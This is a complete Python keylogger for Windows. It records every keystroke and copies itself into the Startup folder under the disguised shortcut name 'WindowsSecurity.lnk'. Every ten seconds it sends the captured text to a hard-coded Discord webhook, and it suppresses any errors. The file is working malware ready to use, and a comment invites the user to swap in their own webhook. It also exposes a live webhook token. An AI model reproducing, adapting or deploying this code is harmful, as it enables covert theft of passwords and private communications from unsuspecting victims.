import os
import sys
import threading
import requests
from pynput import keyboard
import win32com.client

WEBHOOK_URL = "https://discord.com/api/webhooks/1403724123749748747/q7qKYCKKsbvc3Ok1lstQkXEi7mdD6L7vmnRBjbOkmKkIy3g5IwacQOsTbFPzc8L36EO_"  # Replace with your webhook
LOG_INTERVAL = 10
SHORTCUT_NAME = "WindowsSecurity.lnk"
log_buffer = ""

def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_path = os.path.join(startup_path, SHORTCUT_NAME)
    if not os.path.exists(shortcut_path):
        target = os.path.realpath(sys.argv[0])
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.IconLocation = target
        shortcut.save()

def send_log():
    global log_buffer
    if log_buffer:
        try:
            requests.post(WEBHOOK_URL, json={"content": log_buffer})
        except Exception:
            pass
        log_buffer = ""
    threading.Timer(LOG_INTERVAL, send_log).start()

def on_key_press(key):
    global log_buffer
    try:
        log_buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer += " "
        elif key == keyboard.Key.enter:
            log_buffer += "\n"
        else:
            log_buffer += f"[{key.name}]"

def start_logger():
    add_to_startup()
    send_log()
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logger()